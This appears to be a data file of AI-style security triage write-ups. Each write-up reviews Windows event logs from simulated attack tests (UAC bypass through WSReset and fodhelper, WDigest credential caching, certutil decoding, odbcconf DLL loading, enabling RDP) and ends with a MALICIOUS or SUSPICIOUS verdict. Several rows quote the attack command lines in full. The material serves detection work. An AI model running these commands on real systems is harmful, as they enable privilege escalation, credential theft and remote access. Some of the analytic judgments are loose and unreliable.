**MALICIOUS** - The activity within these logs displays clear signs of compromise, involving privilege escalation, potential credential misuse, and suspicious PowerShell scripts to alter system configurations for remote access. Immediate incident response actions should be taken to isolate the host, conduct a thorough investigation, and remediate any identified threats."
UAC Bypass with WSReset Registry Modification,"Upon analyzing the provided Windows event logs, several details that stand out could indicate potential malicious activity. Here's a breakdown of the suspicious elements observed:

### Suspicious Behavior Detected:

1. **PowerShell Activity:**
   - The PowerShell logs reveal the execution of commands that modify the registry settings for a specific application path (HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command) with the intent to execute `cmd.exe`. The commands involve setting a `(default)` value in the registry to invoke `cmd.exe /c start cmd.exe`, which can potentially be used to execute additional shell commands surreptitiously.
   - The execution of `WSReset.exe` with a hidden window (`-WindowStyle Hidden`) is also noted. `WSReset.exe` is a legitimate Windows tool, but its misuse in association with other script activities indicates potential malicious behavior.

2. **Security Log Events:**
   - There is evidence of multiple logon events by the `admin_test` account with elevated privileges (Event ID 4672), including privileges like `SeDebugPrivilege`, which are commonly abused by attackers to gain further access and control.
   - The use of NTLM for authentication in these events is normal but could raise suspicion if NTLM is not commonly used as the authentication protocol in the environment.

3. **Sysmon Log:**
   - Frequent invocation of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` by the user `SERVER002\admin_test` indicates potential command-line actions being executed.
   - The execution of PowerShell scripts, such as the ones listed in the PowerShell log, confirms the launching of processes typically used in attacks to bypass system protections.

### Potential Indicators of Compromise (IoC):

1. **Registry Modification via PowerShell:**
   - The tampering of the registry path to execute command-line applications indicates a persistence mechanism potentially being set up or exploitation of the system for arbitrary command execution.
   
2. **Execution of Unnecessary System Tools:**
   - Hidden execution of legitimate tools (`WSReset.exe`) without user intervention or a confirmed scheduled task.

### Assessment and Recommendation:

Based on the observed actions, particularly the registry modifications and PowerShell misuse, these activities are not characteristic of benign administrative tasks and suggest potential unauthorized actions typically seen in malicious operations.

- **Resolution: MALICIOUS**

### Guidance for Procedural Follow-Up:

1. **Immediate Actions:**
   - Isolate the affected system to prevent further spread of potential malicious activity.
   - Initiate a comprehensive malware scan to identify any harmful processes or scripts.
   - Conduct a review of user account activities, particularly focusing on the `admin_test` account for abnormal activity.

2. **Investigation:**
   - Analyze other systems for similar registry modifications or PowerShell script log entries.
   - Review logs and implement enhanced monitoring on PowerShell and registry activities for suspicious patterns.

3. **Mitigation and Hardening:**
   - Update systems and enforce stricter group policies to control script executions.
   - Deploy security tools that specifically monitor and alert on changes to critical registry paths and PowerShell script executions.

Overall, these logs present clear evidence of potential malicious behavior, necessitating immediate investigative actions and system security measures."
Regsvcs Uninstall Method Call Test,"Upon analyzing the provided logs, several points raise serious concerns and potentially indicate malicious activity:

1. **Use of PowerShell**: The PowerShell logs include a suspicious command involving base64-encoded content being converted into a binary file and compiled using `csc.exe` (C# Compiler). This typically indicates obfuscated activity which is a common technique used by attackers to hide malicious scripts or code.

2. **Executing and Registering a .NET DLL**: The process logs show the compilation and registration of a DLL (`data.009.dll`) using the Microsoft .NET utilities (`csc.exe` and `regsvcs.exe`). This can often be associated with the deployment of a payload or persistence mechanism, a tactic used by malicious actors to maintain a foothold within a compromised environment.

3. **Administrator-level Activity**: The user `admin_test` is frequently seen in the logs executing potentially suspicious activities with a high integrity level, with processes running such as `whoami.exe`, `csc.exe`, and the PowerShell command which appear automated and potentially backdoor-like.

4. **Sysmon Events**: Numerous Sysmon processes were captured involving the execution of several legitimate system utilities (`HOSTNAME.EXE`, `whoami.exe`, `wevtutil.exe`) that can be leveraged in Living Off The Land Binary (LOLBin) scenarios by adversaries to evade defenses.

5. **Privilege Escalation**: The presence of EventID 4672 indicates special privilege access was granted to SYSTEM level processes with SeDebugPrivilege, which is often used by attackers to escalate privileges on a machine.

Given these observations, there are enough strong indicators that a potentially malicious activity took place. The combination of behaviors such as base64 encoded script execution, administrative level authority, compilation and registration of new DLLs, and usage of legitimate OS utilities for potentially nefarious purposes suggest an active attempt at compromise or persistent foothold.

### Resolution:
- **MALICIOUS** - The logs demonstrate a series of activities consistent with techniques used by attackers to execute and establish persistence in a Windows environment, warranting action and further forensics.

### Recommended Actions:
1. **Immediate Isolation**: Consider isolating `Server002` to prevent further potential malicious activity from spreading within the network.

2. **Comprehensive Investigation**: Engage in detailed forensic analysis to better understand the extent of the compromise. This includes memory analysis, disk forensic, and reviewing network logs to trace any data exfiltration or lateral movement.

3. **Containment and Eradication**: Remove any unauthorized code or tools (particularly `data.009.dll`) and scan for other possible backdoors or persistence mechanisms that might have been set up.

4. **Review and Harden Security Posture**: Implement stricter security controls on the network, review and tighten PowerShell and scripting policies, and ensure all systems are patched and updated.

5. **Awareness and Training**: Provide awareness and training to users about the dangers of executing scripts and clicking on suspicious links to minimize the attack surface."
Rundll32 with desk.cpl,"### Analysis of the Logs:

#### Windows PowerShell Log:
- No entries provided, so no analysis can be conducted on PowerShell activity.

#### Application Log:
- **EventID 16384** from the Software Protection Platform Service (SPP) is a general status update or notification, typically indicating routine operations within the service. This is not inherently suspicious nor indicative of malicious activity.

#### Security Log:
- **EventID 4616** indicates time change events, which can be a legitimate administrative action but could also signify an attempt to manipulate system logs for malicious cover-up. However, these changes show only minor adjustments and without additional context of repeated or unusual pattern, they don't necessarily indicate compromise.
- **EventID 4624** with LogonType 5 indicates a service logon, which is typical for system processes, while LogonType 3 is a network logon. The logons by ""admin_test"" with elevated privileges may require further confirmation on whether this user was supposed to have such access.
- **EventID 4672** indicates privilege assignment, and while assigning privileges like `SeDebugPrivilege` is typical for administrative users, auditing of user ""admin_test"" to confirm role appropriateness should be conducted. 
- **EventID 4799** showing ""setup.exe"" running with elevated privileges is potentially concerning, but here it's part of the Edge update which appears benign based on provided context.

#### System Log:
- **Kernel-General (EventID 1 & 24)** indicate changes likely related to system clock corrections and not inherently suspicious. Multiple entries due to slight clock corrections are sometimes seen in environments with time sync issues or adjustments.

#### Sysmon Log:
- **Process Creation and Image Load** events show `wevtutil.exe`, `conhost.exe`, and administrative tools like `whoami.exe` and `cmd.exe` being run by ""admin_test"". Of particular note is a command copying `calc.exe` and renaming it to `not_an_scr.scr`, then attempting to execute it as a screensaver using `rundll32.exe`. This operation is highly suspect and indicative of a potential Trojan or other malicious software attempting to disguise itself.
- The sequence involving `cmd.exe` with the command line copying and renaming `calc.exe` and `rundll32.exe` executing `desk.cpl, InstallScreenSaver` with the renamed file is unequivocally a hallmark of malicious activity.

### Assessment:
The logs provide a clear indication of potentially malicious activity, particularly centered around the `cmd.exe` operation copying `calc.exe` and executing it as a screensaver. This suggests an attempt to place a potentially malicious executable masquerading as a harmless Windows screensaver. 

### Threats & Risks Identified:
- Unauthorized system and network logons could indicate compromised credentials.
- Specifically, the use of `rundll32.exe` with a suspicious command line for screensaver installation reinforces the presence of malicious intent, likely to execute malware covertly.

### Guidance on How to Proceed:
1. Conduct a thorough review of user ""admin_test"" activities and validate permissions.
2. Confirm the presence of unauthorized or malicious files related to the suspicious `not_an_scr.scr` screensaver.
3. Isolate the host (Server002) from the network to prevent potential lateral movement or data exfiltration.
4. Perform a complete malware scan and engage in filesystem integrity checks.
5. Review and strengthen access controls and auditing policies for administrative accounts.
6. Coordinate with the incident response team to evaluate the broader impact and remediate affected systems.

### Final Resolution:
- **MALICIOUS** - The logs contain clear indicators of malicious activity."
Enable RDP via Registry (fDenyTSConnections),"Upon reviewing the provided logs, a few notable activities suggest potential suspicious behavior that warrant further attention:

1. **Time Modification**: 
   - There are several events related to time changes (Event ID 1 from the Kernel-General log and Event ID 4616 from the Security log) where the system time was altered. Such modifications can be indicative of an attempt to align system timestamps with malicious activity or to bypass certain time-based security measures.

2. **Registry Modification**:
   - Sysmon logs indicate the execution of a command to modify the Windows Registry to enable Remote Desktop Protocol (RDP) connections by adding a registry key (`reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f`). This action is potentially dangerous, as enabling RDP can allow unauthorized access.

3. **Privilege Escalation**:
   - Event ID 4672 from the Security log illustrates that the SYSTEM account was granted special privileges, such as SeDebugPrivilege. While SYSTEM accounts typically have elevated privileges in a Windows environment, it's vital to ensure that such privileges are being utilized for legitimate tasks.

4. **Process Creation and Chain**:
   - Numerous instances of `MicrosoftEdgeUpdate.exe` running with different command-line arguments under SYSTEM account. This activity alone isn't inherently suspicious, as it may relate to normal software updates, but should be correlated with a known update schedule or behavior.

5. **Service and Process Activity**:
   - Kernel and Sysmon logs show several services and processes starting and stopping in a short period. Although the `edgeupdate` service stopping isn't unusual and might be related to the updating process, it’s essential to verify with expected behavior and timing, especially given the command line changes observed in the registry.
   - The logs represent considerable activity around processes that can affect system configuration and execution in short succession which should be evaluated.

Given the observations:

### Assessment:
The logs exhibit activities that include time modification, registry changes to enable remote access, and privilege escalations possibly pointing towards preparation for persistent access or exploitation.

### Resolution: 
**SUSPICIOUS**

The activities noted, particularly the time changes and the registry modification to enable RDP, are indicators of suspicious behavior and require further investigation. It is essential to verify:
- The legitimacy of the remote access requirement.
- Correlate the time changes and high-privilege activities with legitimate administrative tasks or scheduled processes.
- Cross-reference these log events with known patch schedules or updates.

### Guidance to Proceed:
- Investigate any recent change requests or software installations that might justify the registry modifications and time changes.
- Monitor RDP access logs for unusual or unauthorized access attempts.
- Evaluate the possibility of unauthorized users exploiting these changes to establish persistent access or conceal malicious activities.
- Conduct a deeper forensic analysis and perform a host-based intrusion detection scan to identify artifacts of potential compromise."
Indirect Command Execution - forfiles.exe,"### Analysis of the Logs

Upon analyzing the provided Windows event logs, several indicators of potential malicious activity have been identified:

#### Suspicious Process Executions
1. **Suspicious Command Line Execution:**
   - The following command line was observed: `""cmd.exe"" /c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe`. The use of `forfiles` to run `calc.exe` in this manner could suggest an attempt to hide or automate unauthorized execution, potentially indicative of a script or malware activity attempting to exploit or test system responses.

2. **Abnormal Use of Wevtutil:**
   - Multiple instances of `wevtutil.exe` being executed by the user `SERVER002\admin_test` within a short time frame. While `wevtutil.exe` is a legitimate tool for managing event logs, frequent and unexplained execution can be indicative of log tampering or attempts to clear logs to erase traces of malicious activity.

3. **Execution of PowerShell/Binaries by SYSTEM User:**
   - The logs demonstrate several instances where Microsoft Edge Update processes are invoked with elevated privileges under `NT AUTHORITY\SYSTEM`, sometimes from temporary directories which could indicate misuse or malicious updates.

#### High Privilege Operations
1. **Privilege Escalation Detection:**
   - Security Audit EventID `4672` with high privileges (SeTakeOwnershipPrivilege, SeDebugPrivilege, etc.) was noted under the SYSTEM account. This is typical for a legitimate system operation, however, if leveraged in non-standard contexts, could be used for privilege escalation.

2. **Multiple SYSTEM Logon Sessions:**
   - Multiple `EventID 4624 - Logon` events for `SYSTEM` with logon type `5` (service) were noted. While these could be routine, their frequency and clustering may warrant further investigation for misuse.

#### General Observations
1. **Frequent Security Audits:**
   - Numerous events relating to credential handling failures (`EventID 5379`) and group membership querying (`EventID 4798`) were noted. While these might occur during normal operations, their presence in close succession can indicate reconnaissance activity by an attacker trying to map out user permissions or attempting credential access.

2. **Defender Updates and Installation:**
   - The Defender updates and installations via `MpCmdRun.exe` and related components seem legitimate given the context of their execution environment.

### Conclusion and Resolution

Considering the identified suspicious command-line execution using `forfiles` and unexplained frequent execution of `wevtutil.exe`, coupled with clustered high privilege events, the system's behavior deviates from typical operational patterns. These deviations suggest an attempt at undocumented administrative tasks or possible early-stage exploitation activities.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed

1. **Investigate Command Line Usage:**
   - Check for any scripts or scheduled tasks that might have led to the suspicious invocation of `cmd.exe` with `forfiles`.

2. **Review Recent Administrative Activity:**
   - Audit the log entries detailing `wevtutil.exe` to ascertain if these were executed in the course of legitimate operations or if they were executed maliciously to tamper logs.

3. **Monitor High Privilege Uses:**
   - Closely monitor any further uses of high-privilege actions and verify their legitimacy through cross-referencing with administrative activity logs and scheduled maintenance records.

4. **Implement & Review Endpoint Protection:**
   - Ensure endpoint protection solutions are configured to alert on script and binary executions that fit similar profiles to those observed, to address potential breaches promptly.

5. **Conduct Network and System Forensics:**
   - Perform a comprehensive review of outgoing network connections and network logs during the timeframes identified within the logs for any indication of data exfiltration or communication with suspicious endpoints.

### Further Investigation

- Engage with users/admins who might have executed these commands to understand the context.
- Consider deploying enhanced logging and detection mechanisms to capture more detailed insights into similar future activities."
System Scope COR_PROFILER,"Based on the provided log entries from various sources including the Application, Windows PowerShell, and Sysmon logs, here's a detailed analysis:

**Suspicious or Anomalous Behavior:**

1. **PowerShell Execution:**
   - There are multiple events (EventIDs 600 and 400 from Windows PowerShell logs) indicating PowerShell scripts that modify system environment variables.
   - The script modifies environment variables related to .NET profiling (`COR_ENABLE_PROFILING`, `COR_PROFILER`, `COR_PROFILER_PATH`), which is unusual for a benign process unless it is part of a legitimate .NET application setup or diagnostics. The `COR_PROFILER_PATH` points to a DLL in a Temp directory, which is highly suspicious.

2. **Sysmon Logs:**
   - The execution of `powershell.exe` with the command modifying system environment variables further supports the suspicion.
   - There is a process chain that involves the use of `wsmprovhost.exe` as a parent for `PowerShell.exe`, which can sometimes be a bypass technique used by attackers for script execution as `wsmprovhost` is often used in Windows Management tasks.

3. **Edge Update:**
   - There are routine-looking `Microsoft Edge Update` activities observed with processes like `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86.exe`. These could likely be benign unless proven otherwise, as they appear to be part of the normal software update mechanism for Microsoft Edge.

**Assessment:**
- The consistent theme of PowerShell activity, especially focusing on environment variables related to profiling and pointing to temporary files, is highly indicative of malicious behavior or preparation for cyber exploitation activities using DLL injection. This activity is common in advanced persistent threat (APT) behaviors where persistence and profiling are key objectives.

**Resolution:**
- **MALICIOUS:** The logs contain activity related to environment variable modification via a PowerShell script setting profiler variables to a temporary directory DLL file, which is a strong indicator of malicious intent. This behavior typically indicates an attempted code injection or information gathering effort.

**Guidance on How to Proceed:**
1. **Immediate Action:**
   - Quarantine the affected host (Server002) to prevent further potential compromise.
   - Initiate a thorough forensic investigation on the system, focusing on the origin and full context of the PowerShell script execution.
   - Ensure the DLL files and scripts involved are analyzed for malicious content or indicators.

2. **Remediation:**
   - Remove any unauthorized environment variable settings and clean up temporary files created during the suspicious activity.
   - Consider reinstalling affected software that uses the COR_PROFILER settings to ensure no backdoor remains.

3. **Prevention:**
   - Implement monitoring solutions that can detect and alert on abnormal PowerShell usage and changes to critical environment variables.
   - Update and enforce group policies to restrict PowerShell execution to only signed and authorized scripts."
WMI Win32_Product Class - Execute Local MSI file with embedded JScript,"Upon reviewing the Windows event logs from the host ""Server002"", several observations and analyses can be derived, which indicate possible anomalous or malicious activities:

### Analysis of Logs:

1. **PowerShell Activity**:
   - In the PowerShell logs, there is consistent execution of `powershell.exe` utilizing `Invoke-CimMethod` with `Win32_Product` to install an MSI package from a temporary directory: 
     ```
     C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_JScript.msi
     ```
   - This kind of activity, which involves executing PowerShell commands to install software from a temporary directory, can be suspicious, especially if unexpected or if executed by unauthorized personnel.

2. **System and Application Logs**:
   - The System logs show standard time sync adjustments and kernel activities. However, the adjustment of time by `svchost.exe` could be a point of attention if it deviates from normal behavior or happens frequently with no clear legitimate reason.
   - Application logs indicate MSI installation attempts at the same path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_JScript.msi`, supporting the PowerShell activity.
   - Repeated entries from Windows Defender indicating it is ""ON"" suggest antivirus protection is enabled but do not indicate any detected threats.

3. **Sysmon Logs**:
   - A Sysmon log records execution of `powershell.exe` with a command to install the MSI package, matching the PowerShell log details. The presence of such logging is useful for correlating command execution across logs.
   - The logs also include various legitimate Windows processes being executed under `SERVER002\admin_test`, a user with administrative privileges. This may be part of normal operations, or it could point toward potential misuse if the account is compromised.
   - There's evidence of Microsoft Edge updates, which seem routine unless the executables and update paths are tampered with.

4. **Security Logs**:
   - Security auditing entries show time changes being adjusted by the LOCAL SERVICE using `svchost.exe`. While time adjustments can occur naturally, they may warrant further review to ensure they are consistent with expected system behavior.

### Conclusion and Assessment:

- **Overall Situation**: The logs reflect behavior that could suggest software installation from an atypical path without clear, legitimate business justification. There’s evidence of programmatic execution via PowerShell.
- **Potential Threat/Risk**: The MSI installation from a temporary directory using PowerShell might indicate a potential compromise or misuse of administrative privileges if it was not authorized.
- **General Guidance**: Confirm the legitimacy of the MSI file and its source. Review user access and ensure that no unauthorized individuals are performing installations. If unauthorized, consider the system compromised. Strengthen endpoint protection and ensure PowerShell logging is appropriately configured to capture future activities.

### Resolution:

Based on the findings and potential signs of suspicious activities—

**Resolution: SUSPICIOUS**

Further investigation is recommended to ascertain whether the activities observed are legitimate or indicative of a compromise."
Use Powershell to Modify registry to store logon credentials,"Upon reviewing the provided event logs, I have identified certain activities that stand out as potentially suspicious or indicative of malicious intent. Here's a summary of the analysis:

1. **Normal Activities:**
   - Regular Microsoft Edge Update processes are observed throughout the logs. The EdgeUpdate, MicrosoftEdgeUpdateSetup, and related executables are expected to run periodically on Windows systems due to their design to keep Microsoft Edge up to date. Most instances seem regular with correct Microsoft signing and known paths.
   - The execution of standard system files such as `hostname.exe`, `whoami.exe`, and WMI-related processes (`WmiPrvSE.exe`) appears to be regular, except in certain contexts as discussed below.

2. **Suspicious Activities:**
   - **PowerShell Execution:**
     - There is a notable PowerShell command that is executed with the following detail:
       ```plaintext
       ""powershell.exe"" Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name 'UseLogonCredential' -Value '1' -ErrorAction Ignore
       ```
     - **Concern**: This action enables the storage of plaintext credentials in memory by enabling WDigest, which is a potential exploit method for credential theft.
     - PowerShell is often leveraged in malicious scripts due to its ability to interact deeply with the operating system, especially registry modifications like this one without further justification can raise red flags.
     
3. **System Clock Manipulation:**
   - Event ID 4616 in security logs indicates a modification of the system clock time, which could be leveraged by attackers to evade log review or manipulate timestamps.
   
4. **Privilege Escalation Indicators:**
   - Event ID 4672 indicates that a process with SYSTEM level privileges had a history of enabling multiple privileges, including `SeDebugPrivilege`, which is often sought after by attackers for debugging and altering system processes.

**Assessment:**
- **Resolution: SUSPICIOUS**
  - The PowerShell script to modify WDigest registry settings combined with the system time change event stands out as suspicious and could indicate an attempt to compromise the security posture of the host (e.g., by enabling credential theft and hiding traces).
  - Such activities warrant a deeper investigation to confirm whether they were legitimately conducted by administrative tasks or are part of malicious activities.
  
**Guidance:**
- **Immediate Actions:**
  - Investigate the authenticity of the user `SERVER002\admin_test` and verify the legitimacy of activities carried out under this account.
  - Audit the execution of the PowerShell command and identify the context or person/entity responsible. If unauthorized, reset WDigest registry keys and ensure security patches are up-to-date.
  - Inspect logs for any corresponding network or application activity that may suggest data exfiltration or communication to external hosts.
- **Further Investigation:**
  - Verify the alteration in the system time and assess if there is a pattern of similar occurrences in the log history.
  - Conduct a full anti-virus and anti-malware scan to rule out any latent threats.

By addressing these suspicious activities promptly, the potential risk can be effectively mitigated, and the integrity of the host system ensured."
Deobfuscate-Decode Files Or Information,"Upon reviewing the provided logs, here's a detailed assessment and analysis:

### Observations:
1. **Security Log Events:**
   - EventID 4634: A logoff event for the user ""admin_test"" on SERVER002 which is normal.
   - EventID 4672: Indicates special privilege assigned to ""admin_test"". The privileges include SeDebugPrivilege, SeTakeOwnershipPrivilege, etc. which are powerful and allow for significant control over the system. Combined with other malicious activities, this could potentially be used for privilege escalation.
   - EventID 4624: A logon event using NTLM authentication from IP 192.168.0.102 to SERVER002 with the user ""admin_test"". This logon type 3 is a network logon and appears ordinary but should be cross-verified with legitimate access sources/IPs.

2. **Sysmon Log Events:**
   - Sysmon EventID 1 and 5 highlight the use of **certutil.exe** with the command line to encode and later decode the `calc.exe` binary. This technique of using certutil for masquerading data (file encoding/decoding) is a known tactic used by attackers for transferring or executing unauthorized binaries.
   - A sequence of processes involving **wevtutil.exe** and **conhost.exe** run under `admin_test` user session. While frequent execution of `wevtutil` could imply log tampering or clearing, here they sequence shows regular process handling.
   - Another observation is the execution of `whoami.exe` and `hostname.exe`, which are generally used for information gathering.

3. **Applications Log:**
   - The only entry from Software Protection Platform Service does not indicate an issue by itself. It seems unrelated to potential malicious activities.

### Assessment:
- **Suspicious Activities**:
  - Use of **certutil.exe** to encode and decode binaries raises a red flag. Although `calc.exe` is a legitimate Windows application, the process used to manipulate it in this manner can suggest an attempt at modifying or disguising/masking files, possibly indicating malicious intent.
  - Privileges granted to `admin_test` and the operations recorded are executed under high integrity levels/contexts, which demands cautious observation.

### Conclusion:
Given the combination of encoding/decoding with certutil and special privileges for the user service execution, which are typical indicators in situations where malicious activity might be occurring, but with insufficient proof of breach or exploitation, the logs contain evidence of activity that is:

**Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed:
1. **Verify the Legitimacy** of `admin_test` User Activities**: Check the network topology and correlate IP addresses with known company resources or expected remote access paths.
2. **Conduct a Thorough Review of Recent Changes or Access from `192.168.0.102`**: Ensure this is a legitimate admin workstation.
3. **Investigate the CertUtil Usage**: Examine if there were any legitimate administrative tasks or policy updates that involved file encoding/decoding.
4. **Check for Other Signs of Host or Network Compromise**: This should include file integrity checks, active firewall rule validation, and malware scans.
5. **Enhance Monitoring and Log Retention**: Ensure that critical system actions are being logged and monitored continuously for better traceability."
Lolbas ie4uinit.exe use as proxy,"Upon reviewing the provided Windows event logs, several activities should be analyzed for potential malicious behavior.

### Sysmon Logs Analysis:
1. **Multiple process creations involving PowerShell**, `wevtutil.exe`, and `rundll32.exe` as observed:
   - The sequence of PowerShell, followed by `wevtutil.exe`, is often utilized by attackers to clear event logs, but further evidence is needed to confirm such activity.
   - `rundll32.exe` is commonly used to execute DLLs and is often seen in malicious activity. However, the logged usage involves typical operations related to Internet Explorer plugins.

2. **Execution of `cmd.exe` with command-line argument:**
   - The command-line argument associated with `cmd.exe` involves copying a file to a temp directory and running it. This is a suspicious activity as it suggests potential execution of a file in the temp directory, which could be indicative of malicious intent or script execution.
   
3. **Execution of processes in sequence:**
   - The execution of processes such as `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` with specific command-line arguments suggests local investigation commands, potentially scripted activity.
   
4. **Large sequence of Microsoft Edge Update processes:**
   - While frequent Edge updates can be seen, the specific use of Temp directories may hint at abnormal temporary operations, often scrutinized for potential malware delivery or persistence mechanisms.

### Application Logs Analysis:
- **Windows Defender Security Product State:**
  - Windows Defender is reported as active, which is a standard security operation, and provides some degree of assurance about system protection.
  
### Security Logs Analysis:
- **Event ID 4624: Logons**
   - Multiple system logons by `SYSTEM` are recorded. This is a common event and does not inherently indicate malicious activity without suspicious patterns linked to unauthorized access attempts.
- **Event ID 4672: Special Privileges Assigned**
   - SYSTEM has been assigned several privileges which are expected, given its operational context.
- **Event ID 4798: Account enumeration attempts**
   - Frequent enumeration of system accounts suggests a script or tool execution on the system, which could indicate reconnaissance.

### Conclusion and Suggested Resolution
- **Primary Concerns:**
  - The use of PowerShell and `cmd.exe` with suspicious command lines, handling of temporary files/directories, and the pattern of frequent user enumeration processes by SYSTEM, suggest that anomaly detection is warranted. 

- **Resolution: SUSPICIOUS**
  - The activities captured lean heavily toward scripted or automated operations. While not explicitly determinable as malicious given the data reviewed, these activities are atypical and warrant further investigation.
  - Recommended actions include:
    - Conduct deeper analysis on command-line invocations and investigate the origin and integrity of files executed.
    - Review Active Directory logs if applicable to correlate any unauthorized access attempts.
    - If available, utilize threat detection tools to identify known signatures of compromise linked to these processes.
    - Isolate the network section of Server002 and perform a thorough review of system registry, task scheduler, and scheduled tasks for persistence mechanisms.

Continuous monitoring and readiness to escalate to a full security incident response may be advised post further investigation based on findings."
Odbcconf.exe - Execute Arbitrary DLL,"Upon analyzing the provided logs, several observations and indicators suggest potential malicious activity:

1. **Process Execution and Command-Line Anomalies:**
   - A series of suspicious commands executed from `cmd.exe`:
     - The execution of `odbcconf.exe` with a command to register a DLL (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.008\\src\\Win32\\data.dll`) using `REGSVR`. This behavior is suspicious as it can be indicative of an attempt to register a malicious DLL, which is commonly used in privilege escalation or persistence strategies.
     - The command involves using a temporary directory path and a specific DLL, which could suggest the use of a staging area for malicious files that could be loaded into a trusted process.

2. **Frequent Execution of System Utilities:**
   - There are multiple instances of `wevtutil.exe`, `conhost.exe`, `powershell.exe`, and `whoami.exe` being executed in quick succession. 
   - Although these processes can have legitimate uses, their rapid execution and combination suggest potential scripting activity or systemic investigations commonly used in reconnaissance or post-exploitation phases.
   
3. **Integrity Level:**
   - All suspicious activities are executed under a high integrity level, indicating potential privilege escalation.

4. **User Account Involvement:**
   - Activity is executed by the user account `SERVER002\\admin_test`, which might either indicate compromise of this account or its use under malicious intent.

5. **Other Observations:**
   - Multiple instances of edge update processes, which could be benign but are worth noting for unexpected behavior or discrepancies against regular scheduled updates.
   - The event of Windows Defender being turned on is recorded, suggesting at least basic protective measures are active, although they might have been turned off briefly during exploitation attempts.

Given these assessments, the analysis points towards the need for more thorough investigation into the cited activities. Specifically, the odbcconf command being used to register an unknown DLL is of high concern. Further examination of the DLL in question, the command origin, and other associated user behaviors would provide more clarity.

**Resolution: SUSPICIOUS**

The activities recorded within the logs suggest suspicious behaviors that warrant further detailed investigation. Actions should include:
- Verification of the DLL file’s origin and legitimacy.
- Validate the intended use and scheduling of edge updates.
- Review of user account activities and any external access logs that might show account compromise.
- Consider isolation or increased monitoring of the affected host, Server002, until the investigation conclusions are drawn."
HTML Smuggling Remote Payload,"Upon analyzing the provided Windows event logs, several indicators suggest potentially suspicious behavior. Here is a detailed breakdown of the findings:

### Application Log
- **Event ID 15** from the **SecurityCenter** indicates Windows Defender is operational, which is a benign entry and provides no direct indication of malicious activity.

### Security Log
- **Event ID 5379** from **Microsoft-Windows-Security-Auditing** shows multiple credential validation operations that failed with return code `3221226021`. Although the reason for these failures isn't directly clear, repeated failures could indicate attempts to access system resources or services inconsistently.

### Sysmon Log
- **Sysmon Event ID 1**: There are various executions of processes such as `powershell.exe`, `conhost.exe`, and several `msedge.exe` instances with arguments that could potentially indicate automation or scripting activity, especially involving `powershell`.
- The PowerShell process executes with a command line referencing a `.html` file located in a temporary folder, which is an unusual behavior for PowerShell known to be exploited in attack chains for executing scripts.
- Sysmon logs also show high integrity levels for processes launched by the `admin_test` user which could hint at privileges being potentially misused for executing these scripts.

### PowerShell Log
- Numerous **Event ID 600** entries indicate the starting of various providers during a PowerShell session that executes a file `data_006_remote.html` through PowerShell, which is highly unusual and potentially harmful if the HTML contains scripts meant to execute in the PowerShell context.

### Assessment and Resolution

Given the overall log activity, particularly the execution of PowerShell with an embedded HTML file, there are strong signs of potentially **suspicious** command executions that require further analysis. The numerous credential validation failures combined with suspect PowerShell usage suggest that these actions could align with a threat actor's movement within the network or exploitation attempts.

### Recommendation

1. **Immediate Action**: Conduct a deeper investigation into the specific `.html` file being executed by PowerShell to determine its purpose and legitimacy.
2. **Containment**: Isolate the machine if further evidence of malicious scripts or indicators are discovered to prevent further potential compromise.
3. **Review Security Policies**: Ensure robust monitoring around PowerShell use, especially for executing files from temporary directories.
4. **Audit Privileges**: Check and verify the administrative privileges used by `admin_test` and investigate any unauthorized modifications.
5. **Credential Review**: Address the credential authentication failures and ensure this is not indicative of attempted brute force or enumeration activities.

Final assessment: **SUSPICIOUS** - Log activity suggests behaviors that warrant further investigation to rule out or confirm malicious intent."
Bypass UAC using Fodhelper - PowerShell,"Upon examining the provided logs, several events and activities stand out as indicators of potentially malicious activity:

### Security Log:
1. **Event 4624 and 4672:**
   - A logon event (ID: 4624) and a special privileges assignment event (ID: 4672) have occurred. The logon type is 5, which indicates a service account logon. The privileges listed in 4672 include high-level privileges such as `SeDebugPrivilege`, which can be exploited for malicious purposes.

### Windows PowerShell Log:
2. **PowerShell Activity:**
   - The logs show PowerShell command execution involving the manipulation of the registry key `HKCU:\software\classes\ms-settings\shell\open\command`. This is consistent with a known privilege escalation technique using `fodhelper.exe`, a Windows executable that allows UAC bypass by exploiting the auto-elevation feature in Windows.
   - The command attempts to change the default value to `C:\Windows\System32\cmd.exe`, which is a suspicious behavior pointing towards an attempt to gain elevated privileges without prompting UAC.

### Sysmon Log:
3. **Process Creation Events:**
   - Execution of processes like `PowerShell.exe` and `whoami.exe` by the `admin_test` user account with high integrity level is noted. The `CommandLine` parameter for `powershell.exe` mentions registry actions similar to what is highlighted above, confirming the use of a potential UAC bypass technique.
   - There are multiple instances of process creation for `conhost.exe` linked to `hostname.exe` and other utilities, which could be benign but require scrutiny in the context of ongoing suspicious activity.

### Application Log:
4. **Microsoft Edge Update Activity:**
   - The repetitive execution and updates involving `MicrosoftEdgeUpdate.exe` seem like regular updates, but given the context of suspicious PowerShell activity, they warrant closer inspection to rule out any exploitation of auto-update mechanisms.

### Overall Assessment:
The logs contain indicators of possibly malicious behavior focused around privilege escalation activities using PowerShell scripts. This is evidenced by the specific registry and `fodhelper.exe` manipulations, which are known techniques used to elevate privileges on Windows systems without raising user suspicion.

### Guidance:
- **Immediate Action:** Isolate the affected host to prevent any further lateral movement within the network.
- **Investigation:** Conduct a thorough forensic analysis of the system, focusing on registry changes, PowerShell scripts, and any unauthorized access attempts.
- **Review Privileges:** Review and restrict unnecessary administrative permissions and consider implementing stricter Group Policy settings to prevent such occurrences.
- **Monitoring and Prevention:** Increase logging of PowerShell activity using script block logging and constrain language mode to mitigate potential future exploits.

### Resolution: 
- **MALICIOUS** - The logs contain confirmed indicators of compromise through suspected privilege escalation activity, which aligns with known exploitation techniques using PowerShell for elevating privileges without user consent."
